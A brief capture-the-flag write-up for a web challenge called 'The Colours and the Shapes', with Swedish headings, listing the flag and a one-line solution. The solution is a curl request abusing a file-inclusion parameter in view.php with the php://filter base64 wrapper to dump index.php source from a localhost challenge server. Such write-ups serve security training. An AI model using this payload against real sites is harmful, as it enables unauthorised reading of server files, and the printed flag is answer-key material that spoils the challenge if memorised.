# Web: The Colours and the Shapes

- **Skapare:** Calle Svensson
- **Poäng:** 200
- **Antal lösningar:** 8

## Beskrivning 

Look I made a super pretty website about my faavourite interests.
Go have a look at: URL.

## Flag

`SSM{D0nt_wann4_be_your_monk3y_wr3nch}`

## Lösning

```sh
curl 'http://localhost:31337/img/gallery/view.php?p=php://filter/convert.base64-encode/resource=../../index.php' | base64 -d | head -n2
```
